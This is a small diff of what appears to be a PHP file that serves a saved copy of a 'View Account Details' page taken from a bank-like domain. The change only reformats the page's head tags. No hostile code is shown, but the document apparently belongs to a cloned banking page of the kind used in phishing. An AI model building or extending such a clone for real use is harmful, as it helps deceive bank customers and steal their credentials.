@@ -66,7 +66,10 @@ if($stmt = $pdo->prepare($sql)){
 
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <!-- saved from url=(0047)https://captonebk.com/us/secure/view/?v=Account -->
-<html xmlns="http://www.w3.org/1999/xhtml" class="gr__captonebk_com"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="./files/livechatinit2.js"></script><script src="./files/resources2.aspx"></script><link rel="stylesheet" href="./files/chatinline.css">
+<html xmlns="http://www.w3.org/1999/xhtml" class="gr__captonebk_com"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="./files/livechatinit2.js">
+</script><script src="./files/resources2.aspx"></script>
+<link rel="stylesheet" href="./files/chatinline.css">
 
 <title>View Account Details</title>
 
